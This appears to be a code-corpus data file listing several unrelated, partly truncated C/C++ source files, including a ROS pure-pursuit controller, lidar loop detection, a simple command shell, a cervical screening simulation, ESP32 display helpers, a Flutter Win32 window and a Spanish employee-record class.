    "#include <ros/ros.h>\n#include <geometry_msgs/Twist.h>\n#include <geometry_msgs/Point.h>\n#include <visualization_msgs/Marker.h>\n\nusing namespace std;\n\nros::Publisher car_control_pub;\nros::Publisher rviz_target_point_pub;\n\nfloat car_steering_rad = 0.0;\ndouble deg2rad = M_PI/180;\ndouble rad2deg = 180/M_PI;\ndouble car_pos_x, car_pos_y = 0.0;\n\n//////////////////////////////////////////////////////////\nstd::pair<double ,double> target_point = {5.0, 2.76756905};\n        \ndouble car_velocity = 0.3; \n\ndouble look_distance = 3.0;\n/////////////////////////////////////////////////////////\n\nfloat Calculate_steering()\n{\n    double dx = (target_point.first - car_pos_x);\n    double dy = (target_point.second - car_pos_y);\n\n    double dist = sqrt(dx*dx + dy*dy);\n\n    double alpha = atan2(dy, dx);\n\n    float steering_rad = atan2((2*1.04*sin(alpha)), look_distance);\n\n    return steering_rad;\n}\n\nvoid Car_pos_Callback(const geometry_msgs::Point::ConstPtr &car_pos)\n{\n    car_pos_x = car_pos->x;\n    car_pos_y = car_pos->y; \n}\n\nvoid Publish_control_value()\n{\n    geometry_msgs::Twist car_control;\n\n    car_control.linear.x = car_velocity;\n    car_control.angular.z = car_steering_rad;\n\n    car_control_pub.publish(car_control);\n}\n\nvoid Rviz_target_point()\n{\n    visualization_msgs::Marker t_point;\n\n    t_point.header.frame_id = \"edu_frame\";\n    t_point.header.stamp = ros::Time::now();\n    t_point.ns = \"target_point\";\n    t_point.id = 0;\n    t_point.type = visualization_msgs::Marker::SPHERE;\n    t_point.action = visualization_msgs::Marker::ADD;\n    t_point.lifetime = ros::Duration(0.2);\n\n    t_point.pose.position.x = target_point.first;\n    t_point.pose.position.y = target_point.second;\n    t_point.pose.position.z = 0;\n\n    t_point.scale.x = 0.3;\n    t_point.scale.y = 0.3;\n    t_point.scale.z = 0.0;\n\n    t_point.color.r = 0.0;      \n    t_point.color.g = 1.0;     \n    t_point.color.b = 0.0;\n    \n    t_point.color.a = 1.0;\n\n    rviz_target_point_pub.publish(t_point);\n}\n\nint main(int argc, char **argv)\n{\n\tros::init(argc, argv, \"edu_pure_pursuit_node\");\n\tros::NodeHandle nh;\n\n    ros::Rate loop(8);\n\n    ros::Subscriber car_position_sub = nh.subscribe<geometry_msgs::Point>(\"/car_position\", 10, &Car_pos_Callback);\n\n    car_control_pub = nh.advertise<geometry_msgs::Twist> (\"/control_value\", 10);\n    rviz_target_point_pub = nh.advertise<visualization_msgs::Marker> (\"/rviz_target_point\", 10);\n\n\twhile(ros::ok())\n    {\t\n        car_steering_rad = Calculate_steering();\n\n        Publish_control_value();\n        Rviz_target_point();\n\n        cout << \"Look distance : \" << look_distance << endl;\n        cout << \" \" << endl;\n        \n        cout << \"Target point position(X, Y)[m]\" << endl;\n        cout << target_point.first << \", \" << target_point.second << endl;\n        cout << \" \" << endl;\n\t\n        cout << \"Car velocity[m/s] : \" << car_velocity << endl;\n        cout << \"Car steering[deg] : \" << car_steering_rad*rad2deg << endl;\n        cout << \" \" << endl;\n\n        cout << \"Car position(X, Y)[m]\" << endl;\n        cout << car_pos_x << \", \" << car_pos_y << endl;\n        cout << \" \" << endl;\n\n        cout << \"****************************\" << endl;\n        cout << \" \" << endl;\n\n        loop.sleep();\n\n\t\tros::spinOnce();\n\t}\n\t\n    return 0;\n}\n",
    "// Author of ISCLOAM: Wang Han\n// Email wh200720041@gmail.com\n// Homepage https://wanghan.pro\n\n#include \"iscGenerationClass.h\"\n#define INTEGER_INTENSITY\nISCGenerationClass::ISCGenerationClass()\n{\n}\n\nvoid ISCGenerationClass::init_param(int rings_in, int sectors_in, double max_dis_in)\n{\n    rings = rings_in;\n    sectors = sectors_in;\n    max_dis = max_dis_in;\n    ring_step = max_dis / rings;\n    sector_step = 2 * M_PI / sectors;\n    print_param();\n    init_color();\n\n    current_point_cloud = pcl::PointCloud<pcl::PointXYZI>::Ptr(new pcl::PointCloud<pcl::PointXYZI>());\n}\n\nvoid ISCGenerationClass::init_color(void)\n{\n    for (int i = 0; i < 1; i++)\n    { // RGB format\n        color_projection.push_back(cv::Vec3b(0, i * 16, 255));\n    }\n    for (int i = 0; i < 15; i++)\n    { // RGB format\n        color_projection.push_back(cv::Vec3b(0, i * 16, 255));\n    }\n    for (int i = 0; i < 16; i++)\n    { // RGB format\n        color_projection.push_back(cv::Vec3b(0, 255, 255 - i * 16));\n    }\n    for (int i = 0; i < 32; i++)\n    { // RGB format\n        color_projection.push_back(cv::Vec3b(i * 32, 255, 0));\n    }\n    for (int i = 0; i < 16; i++)\n    { // RGB format\n        color_projection.push_back(cv::Vec3b(255, 255 - i * 16, 0));\n    }\n    for (int i = 0; i < 64; i++)\n    { // RGB format\n        color_projection.push_back(cv::Vec3b(i * 4, 255, 0));\n    }\n    for (int i = 0; i < 64; i++)\n    { // RGB format\n        color_projection.push_back(cv::Vec3b(255, 255 - i * 4, 0));\n    }\n    for (int i = 0; i < 64; i++)\n    { // RGB format\n        color_projection.push_back(cv::Vec3b(255, i * 4, i * 4));\n    }\n}\n\nvoid ISCGenerationClass::print_param()\n{\n    std::cout << \"The ISC parameters are:\" << rings << std::endl;\n    std::cout << \"number of rings:\\t\" << rings << std::endl;\n    std::cout << \"number of sectors:\\t\" << sectors << std::endl;\n    std::cout << \"maximum distance:\\t\" << max_dis << std::endl;\n}\n\nISCDescriptor ISCGenerationClass::calculate_isc(const pcl::PointCloud<pcl::PointXYZI>::Ptr filtered_pointcloud)\n{\n    ISCDescriptor isc = cv::Mat::zeros(cv::Size(sectors, rings), CV_8U);\n\n    for (int i = 0; i < (int)filtered_pointcloud->points.size(); i++)\n    {\n        ROS_WARN_ONCE(\"intensity is %f, if intensity showed here is integer format between 1-255, please uncomment #define INTEGER_INTENSITY in iscGenerationClass.cpp and recompile\", (double)filtered_pointcloud->points[i].intensity);\n        double distance = std::sqrt(filtered_pointcloud->points[i].x * filtered_pointcloud->points[i].x + filtered_pointcloud->points[i].y * filtered_pointcloud->points[i].y);\n        if (distance >= max_dis)\n            continue;\n        double angle = M_PI + std::atan2(filtered_pointcloud->points[i].y, filtered_pointcloud->points[i].x);\n        int ring_id = std::floor(distance / ring_step);\n        int sector_id = std::floor(angle / sector_step);\n        if (ring_id >= rings)\n            continue;\n        if (sector_id >= sectors)\n            continue;\n#ifndef INTEGER_INTENSITY\n        int intensity_temp = (int)(255 * filtered_pointcloud->points[i].intensity);\n#else\n        int intensity_temp = (int)(filtered_pointcloud->points[i].intensity);\n#endif\n        if (isc.at<unsigned char>(ring_id, sector_id) < intensity_temp)\n            isc.at<unsigned char>(ring_id, sector_id) = intensity_temp;\n    }\n\n    return isc;\n}\n\nISCDescriptor ISCGenerationClass::getLastISCMONO(void)\n{\n    return isc_arr.back();\n}\n\nISCDescriptor ISCGenerationClass::getLastISCRGB(void)\n{\n    // ISCDescriptor isc = isc_arr.back();\n    ISCDescriptor isc_color = cv::Mat::zeros(cv::Size(sectors, rings), CV_8UC3);\n    for (int i = 0; i < isc_arr.back().rows; i++)\n    {\n        for (int j = 0; j < isc_arr.back().cols; j++)\n        {\n            isc_color.at<cv::Vec3b>(i, j) = color_projection[isc_arr.back().at<unsigned char>(i, j)];\n        }\n    }\n    return isc_color;\n}\n\nvoid ISCGenerationClass::loopDetection(const pcl::PointCloud<pcl::PointXYZI>::Ptr &current_pc, Eigen::Isometry3d &odom)\n{\n\n    pcl::PointCloud<pcl::PointXYZI>::Ptr pc_filtered(new pcl::PointCloud<pcl::PointXYZI>());\n    ground_filter(current_pc, pc_filtered);\n    ISCDescriptor desc = calculate_isc(pc_filtered);\n    Eigen::Vector3d current_t = odom.translation();\n    // dont change push_back sequence\n    if (travel_distance_arr.size() == 0)\n    {\n        travel_distance_arr.push_back(0);\n    }\n    else\n    {\n        double dis_temp = travel_distance_arr.back() + std::sqrt((pos_arr.back() - current_t).array().square().sum());\n        travel_distance_arr.push_back(dis_temp);\n    }\n    pos_arr.push_back(current_t);\n    isc_arr.push_back(desc);\n\n    current_frame_id = pos_arr.size() - 1;\n    matched_frame_id.clear();\n    // search for the near neibourgh pos\n    int best_matched_id = 0;\n    double best_score = 0.0;\n    for (int i = 0; i < (int)pos_arr.size(); i++)\n    {\n        double delta_travel_distance = travel_distance_arr.back() - travel_distance_arr[i];\n        double pos_distance = std::sqrt((pos_arr[i] ",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <cstring>\n#include <unistd.h>\n#include <sys/wait.h>\n#include <sys/stat.h>\n#include <pwd.h>\n#include <filesystem>\n\nusing namespace std;\n\nstring prompt;\nstring welcome;\nstring input;\n\n// Defining methods\nstring getHomeDirectory();\nstring formatText(const string &value);\nint shell();\nint executeCommand(string command);\nint executeCommandFromFile(string file);\nint help(string parameters);\nint echo(string text);\nint set(string parameters);\nint writeWelcome();\nint getWelcome();\nint writePrompt();\nint getPrompt();\nint createConfigDir();\n\nint main(int argc, char *argv[])\n{\n    if (argc >= 3 && strcmp(argv[1], \"-c\") == 0)\n    {\n        string command;\n        for (int args = 2; args < argc; args++)\n        {\n            cout << args;\n            command.append(argv[args]);\n            command.append(\" \");\n        }\n        executeCommand(command);\n        cout << command;\n        exit(0);\n    }\n\n    // Get prompt from configuration and if not set use default prompt\n    if (getPrompt())\n    {\n        cout << \"Run \\\"set prompt\\\" to set a prompt.\" << endl;\n        prompt = \"\\033[36m[{username}@{hostname}] \\033[37m{cwd} \\033[36m$ \";\n        writePrompt();\n    }\n\n    // Get welcome from configuration and apply placeholders and colors\n    getWelcome();\n    if (welcome != \"\")\n    {\n        cout << formatText(welcome) << endl;\n    }\n\n    while (true)\n    {\n        shell();\n    }\n}\n\n// Prompt and input handler\nint shell()\n{\n    cout << formatText(prompt) + \"\\033[0m\";\n    getline(cin, input);\n    executeCommand(input);\n    return 0;\n}\n\n// Executes a command\nint executeCommand(string command)\n{\n    if (command.find(\"cd \") == 0)\n    {\n        chdir(command.substr(3).data());\n    }\n    else if (command.find(\"set\") == 0)\n    {\n        if (command.size() >= 4)\n        {\n            set(command.substr(4).data());\n        }\n        else\n        {\n            set(\"\");\n        }\n    }\n    else if (command.find(\"exit\") == 0)\n    {\n        int exitcode = 1;\n        if (command.size() > 5)\n        {\n            exitcode = stoi(command.substr(5));\n        }\n        exit(exitcode);\n    }\n    else if (command.find(\"echo\") == 0)\n    {\n        if (command.size() > 5)\n        {\n            echo(command.substr(5).data());\n        }\n    }\n    else if (command.find(\"help\") == 0)\n    {\n        if (command.size() > 5)\n        {\n            help(command.substr(5).data());\n        }\n        else\n        {\n            help(\"\");\n        }\n    }\n    else if (command != \"\")\n    {\n        executeCommandFromFile(command);\n    }\n    return 0;\n}\n\n// Executes a file\nint executeCommandFromFile(string file)\n{\n    istringstream iss(file);\n    vector<char *> args;\n    string arg;\n    while (iss >> arg)\n    {\n        args.push_back(strdup(arg.c_str()));\n    }\n    args.push_back(nullptr);\n\n    pid_t pid = fork();\n    if (pid == 0)\n    {\n        if (execvp(args[0], const_cast<char *const *>(args.data())) == -1)\n        {\n            if (errno == ENOENT)\n            {\n                cerr << \"Error: Command '\" << file << \"' not found.\" << endl;\n                exit(1);\n            }\n        }\n    }\n    else if (pid > 0)\n    {\n        wait(NULL);\n    }\n    else\n    {\n        cout << \"Failed to fork process.\" << endl;\n    }\n    for (auto &arg : args)\n    {\n        free(arg);\n    }\n    return 0;\n}\n\n// Shows the help message\nint help(string parameters)\n{\n    if (parameters == \"commands\")\n    {\n        cout << \"Shelly provides the following built-in commands:\\n\\n\"\n                     \"- set <prompt/placeholder> <value>: Allows changing the prompt or placeholder.\\n\"\n                     \"- cd <directory>: Changes the current directory.\\n\"\n                     \"- echo [text]: Writes text to the console.\\n\"\n                     \"- exit [exit code]: Exits the shell.\\n\";\n    }\n    else if (parameters == \"placeholders\")\n    {\n        cout << \"Placeholders are a symbolic representation of something that will later be replaced with it's actual value later by the shell. This can be used in your prompt or welcome message.\\n\\n\"\n                     \"- {cwd}: Current working directory.\\n\"\n                     \"- {username}: Username of the current user.\\n\"\n                     \"- {hostname}: Hostname (PC name).\\n\";\n    }\n    else if (parameters == \"colors\")\n    {\n        cout << \"You can use the \\\\033[Xm sequence to adjust the foreground and background colors of your prompt or welcome message text. Simply substitute 'X' with the appropriate color code from the provided table:\\n\\n\"\n                     \"| Color Name  | Foreground Color Code  | Background Color Code |\\n\"\n                     \"| Black       | 30                     | 40                    |\\n\"\n                     \"| Red         | 31                     | 41                    |\\n\"\n                     \"| Green       | 32                     | 42                    |\\n\"\n                     \"| Yellow      | 33                     | 43 ",
    " // Cervix Screening Program CSP\r\n// Marcel Greuter\r\n// 22 july 2021 - initial version 01\r\n// 24 july 2021 - version 02 sensitivities adapted according to values in Model01.pptx\r\n// 1 oct 2021 - version 03 MG: changed and corrected transition probabilities\r\n// 14 nov 2021 - trial version 04 MG: first cost-effectiveness version\r\n// 19 nov 2021 - bug fixed in readCumDeathProb, version ready for testing\r\n// 29 nov 2021 - final version 04 for testing... :)\r\n// 31 jan 2022 - after revision of the flow chart, version 05 was build, now ready for testing...\r\n// 4 feb 2022 - Version with new flow chart implemented\r\n// 5 feb 2022 - Debug function added to check flow chart\r\n// 6 feb 2022 -\tsurvival as a function of FIGO state coded\r\n// to do: false positives have to be added, compliance function has to be adapted, all parameters to an input file\r\n// 11 feb 2022 - version 06. adapted det file\r\n// 23 mrt 2022 - version 07. New flow chart\r\n// 31 mrt 2022 - update FIGO distribution and Survival (IKNL data)\r\n// 10 apr 2022 - Update survival as a function of stage and age: see routine TumorSurvival\r\n// 28 apr 2022 - Update Confirmatory diagnosis\r\n// 9 may 2022 - Check on opening output files, corrected CIN2 and CIN3 to HPV+ transition\r\n// 1 july 2022 - Add a screening test at age 65 if HPV+\r\n// 8 july 2022 - Version 11. Added number of detected stages in the output\r\n// 13 july 2022 - Number of detected stages per age in the output, compliance function also includes age 65\r\n// 21 july 2022 - Ndetected only counted for direct referrals. There was no Ndetected for age 65 because there are 8 screen ages, not 7: this has been corrected.\r\n// 25 july 2022 - Version 12. False positives included\r\n// 2 jan 2023 - Version 13b. Base case scenario\r\n// 12 jan 2023 - Version 13_1. Scenario 1. Age of death added to output, independent of participation in screening\r\n// 17 jul 2023 - Number of iterations include by Nit\r\n\r\n\r\n#include <iostream> \r\n#include <cstdlib> \r\n#include <time.h>\r\n#include <cmath>\r\n#include <conio.h>\r\n\r\n#define ScreeningOn 1// turn screening on or off\r\n#define Nwomen 100000\r\n#define debug 0\r\n#define Nit 10 \r\n\r\nusing namespace std; \r\n\r\nint CurrentState = 0 ;\r\nint age = 0 ;\r\nfloat cumDeathProb[101] ;\r\nint NFalsePositive = 0 ;\r\nfloat costs ;\r\nFILE *fp2 ;\r\nint FIGOstate ;\r\n\r\nint DetScreenAge = 0 ;\r\nint DetCompliance = 0 ;\r\nint DetReferral = 0 ;\r\nint DetState = -1 ;\r\nint DetFIGO = -1 ;\r\nfloat DetDeathAge = -1 ;\r\nfloat DetNaturalDeathAge = -1 ;\r\nint DetTreatment = 0 ;\t\t\t\t\t\t\t\t\t\t\t\t// 13-01-23 added\r\n\r\nint Ndetected[8][6] ; \t\t\t\t\t\t\t\t\t\t\t\t// detected lesions for 8 ages: 30, 35..65 and 6 stages: HPV-, HPV+, ... cancer \r\n\r\ndouble Random()\r\n{\r\n\treturn (double)rand() / (double)((unsigned)RAND_MAX + 1 ) ;\r\n}\r\n\r\nvoid HPVmin( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 0\r\n{\r\n\tdouble rnd = Random() ;\r\n\tif ( ( age >= 15 ) and ( age <= 24 ) and ( rnd < 0.074 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 25 ) and ( age <= 34 ) and ( rnd < 0.098 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 35 ) and ( age <= 44 ) and ( rnd < 0.050 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 45 ) and ( age <= 54 ) and ( rnd < 0.036 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 55 ) and ( rnd < 0.027 ) )\r\n\t\tCurrentState = 1 ;\r\n\r\n}\r\n\r\nvoid HPVplus( void )\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 1\r\n{\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.5034 ) \r\n\t\tCurrentState = 0 ;\r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.5034+0.0610 ) \r\n\t\t\tCurrentState = 2 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif ( rnd < 0.5034+0.0610+0.0034 ) \r\n\t\t\t\tCurrentState = 3 ;\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif ( rnd < 0.5034+0.0610+0.0034+0.0072  ) \r\n\t\t\t\t\t\tCurrentState = 4 ;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid CIN1( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 2\r\n{\t\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.4000 ) \r\n\t\tCurrentState = 0 ;\r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.4000+0.1600 ) \r\n\t\t\tCurrentState = 1 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif( rnd < 0.4000+0.1600+0.0242 ) \r\n\t\t\t\tCurrentState = 3 ;\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif( rnd < 0.4000+0.1600+0.0242+0.0047 ) \r\n\t\t\t\t\tCurrentState = 4 ;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\t\t\r\n\r\nvoid CIN2( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 3\r\n{\t\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.0073 ) \r\n\t\tCurrentState = 1 ; \r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.0073+0.0244 ) \r\n\t\t\tCurrentState = 2 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif ( rnd < 0.0073+0.0244+0.0474 ) \r\n\t\t\t\tCurrentState = 4 ;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid CIN3( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 4\r\n{\t\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.0025 ) \r\n\t\tCurrentState = 1 ;\r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.0025+0.0074 ) \r\n\t\t\tCurrentState = 2 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif ( rnd < 0.0025+0.0074+0.0486 ) \r\n\t\t\t\tCurrentState = 3 ;\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif ( rnd < 0.0025+0.0074+0.0486+0.04) \r\n\t\t\t\t\tCurrentState = 5 ;\t\t\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\t} \r\n\t\r\n\t\r\n// testing:\tCurrentState = 5 ;\r\n}\r\n\r\ndouble TumorSurvival( int age, int cc ) // Survivalprobability is given by y=a*exp(bt)+c\r\n{\r\n\tdouble y = Random() ;\r\n\tdouble t ;\r\n\tint j ;\r\n\tconst double a[5][7] = { {  2.010455946,  1.587227382,   1.891873867,  4.999864589,  9.895077586,  50.0,         76.9734858 },\r\n\t                         { 13.85142061,\t 12.08714041,   19.167867",
    "#include <Arduino.h>\n#include <LovyanGFX.hpp>\n#include \"lgfx_ESP32_2432S028.h\"\n#include <SPI.h>\n\nusing Action = void(&)(LGFX &lcd);\n\nvoid nop(LGFX &lcd){};\n\nvoid calibrateTouchPad(LGFX &lcd)\n  {\n    lcd.fillScreen(TFT_BLACK);\n    lcd.setTextSize((std::max(lcd.width(), lcd.height()) + 255) >> 8);\n\n    //if (lcd.width() < lcd.height()) lcd.setRotation(lcd.getRotation() ^ 1);\n\n    // Draws guidance text on the screen\n    lcd.setTextDatum(textdatum_t::middle_center);\n    lcd.setTextSize(1.0);\n    lcd.drawString(\"touch the arrow marker\", lcd.width()>>1, lcd.height() >> 1);\n    lcd.setTextDatum(textdatum_t::top_left);\n\n    // When using touch, perform calibration. Touch the tips of the arrows \n    // that appear in the four corners of the screen in sequence.\n    uint16_t fg = TFT_WHITE;\n    uint16_t bg = TFT_BLACK;\n    if (lcd.isEPD()) std::swap(fg, bg);\n    uint16_t caldata[8];\n    lcd.calibrateTouch(caldata, fg, bg, std::max(lcd.width(), lcd.height()) >> 3);\n    //lcd.calibrateTouch(nullptr, fg, bg, 20);\n    Serial.printf(R\"(\nRaw Touch Values\n----------------\nx0 = %4d y0 =%4d\nx1 = %4d y1 =%4d\nx2 = %4d y2 =%4d\nx3 = %4d y3 =%4d \n)\", caldata[0], caldata[1], caldata[2], caldata[3], \n    caldata[4], caldata[5], caldata[6], caldata[7]);\n    \n    log_e(\"==> done\");\n  }\n\n\n/**\n * Draw a framed crosshair in portrait orientation\n*/\nvoid framedCrosshair(LGFX &lcd)\n{\n  char str[24]; \n  lcd.fillScreen(TFT_BLACK);\n  lcd.drawRect(0,0, lcd.width(), lcd.height(), TFT_RED);\n  lcd.drawLine(0,0, lcd.width(), lcd.height(), TFT_GREEN);\n  lcd.drawLine(lcd.width(),0, 0, lcd.height(), TFT_BLUE);\n  lcd.fillRect(0,0, 20, 20, TFT_GREEN);\n  lcd.fillRect(lcd.width()-10,lcd.height()-10, 10, 10, TFT_RED);;\n  lcd.setTextSize(1.0);\n  sprintf(str, \"(0,0) origin, rot=%d\", lcd.getRotation());\n  lcd.drawString(str, 25,0);\n}\n\n/**\n * Draw a grid 20 x 20 \n*/\nvoid grid(LGFX &lcd)\n{\n  int x = 0, y = 0, d = 20;\n  lcd.fillScreen(TFT_BLACK);\n  while (y < lcd.height())\n  {\n    lcd.drawLine(0, y, lcd.width(), y, TFT_WHITE);\n    y += d;\n  }\n\n  while (x < lcd.width())\n  {\n    lcd.drawLine(x, 0, x, lcd.height(), TFT_WHITE);\n    x += d;\n  }\n  \n}\n\n/**\n * Show some facts about the display\n*/\nvoid lcdInfo(LGFX &lcd)\n{\n  Serial.printf(R\"(\nLCD Info\n--------\nwidth x height = %d x %d \nrotation       = %d \ncolor depth    = %d \ntext size X    = %4.2f\ntext size Y    = %4.2f\n)\", lcd.width(), lcd.height(), lcd.getRotation(), lcd.getColorDepth(),\n    lcd.getTextSizeX(), lcd.getTextSizeY());\n  Serial.printf(\"\\n\");\n}\n\n\nGFXfont defaultFont = fonts::DejaVu18;\n\n/**\n * Initialize display and call the greeting function.\n * The default for greeting is nop(). To calibrate the \n * touchscreen call it as initDisplay(lcd, calibrateTouchScreen).\n * The greeting function takes as argument the passed lcd\n*/\nvoid initDisplay(LGFX &lcd, uint8_t rotation=0, GFXfont *theFont=&defaultFont, Action greet=nop)\n  {\n    lcd.begin() ? log_i(\"--> done\") : log_i(\"--> failed\");\n    lcd.clear();\n    lcd.setTextSize(1.0);\n    lcd.setTextDatum(lgfx::textdatum::TL_DATUM);\n    lcd.setFont(theFont);\n    lcd.setRotation(rotation);\n    lcd.setBrightness(255);\n    greet(lcd);\n    log_i(\"==> done\");\n  }\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include<iostream>\n#include <limits>\n#include <algorithm>\nusing namespace std;\nclass Persona{\nprivate:\n\tint id;\n\tstring nombre;\n\tstring apellidoPaterno;\n\tstring apellidoMaterno;\n\tstring sexo;\n\tint edad;\n\tstring direccion;\n\tint telefono;\n\tstring puesto;\n\tstring departamento;\n\tint horasTrabajadas;\n\tdouble costoPorHora;\n\tdouble sueldo;\npublic:\n\tPersona() : id(0), nombre(\"\"), apellidoPaterno(\"\"),\n\tapellidoMaterno(\"\"), sexo(\"\"), edad(0), direccion(\"\"), telefono(0),\n\tpuesto(\"\"), departamento(\"\"), horasTrabajadas(0), costoPorHora(0),\n\tsueldo(0) {}\n\n\n\tPersona(int _id,string _nombre,string _apellidoPaterno,string _apellidoMaterno,\n\tstring _sexo,int _edad,string _direccion,int _telefono,string _puesto,string _departamento,\n\tint _horasTrabajadas,double _costoPorHora,double _sueldo):id(_id), nombre(_nombre), apellidoPaterno(_apellidoPaterno),\n\tapellidoMaterno(_apellidoMaterno), sexo(_sexo), edad(_edad), direccion(_direccion), telefono(_telefono),\n\tpuesto(_puesto), departamento(_departamento), horasTrabajadas(_horasTrabajadas), costoPorHora(_costoPorHora),\n\tsueldo(_horasTrabajadas * _costoPorHora) {}\n\n\tvoid setdatos(int _id,string _nombre,string _apellidoPaterno,string _apellidoMaterno,\n\tstring _sexo,int _edad,string _direccion,int _telefono,string _puesto,string _departamento,\n\tint _horasTrabajadas,double _costoPorHora,double _sueldo)\n\t{\n\tid = _id;\n\tnombre = _nombre;\n\tapellidoPaterno = _apellidoPaterno;\n\tapellidoMaterno = _apellidoMaterno;\n\tsexo = 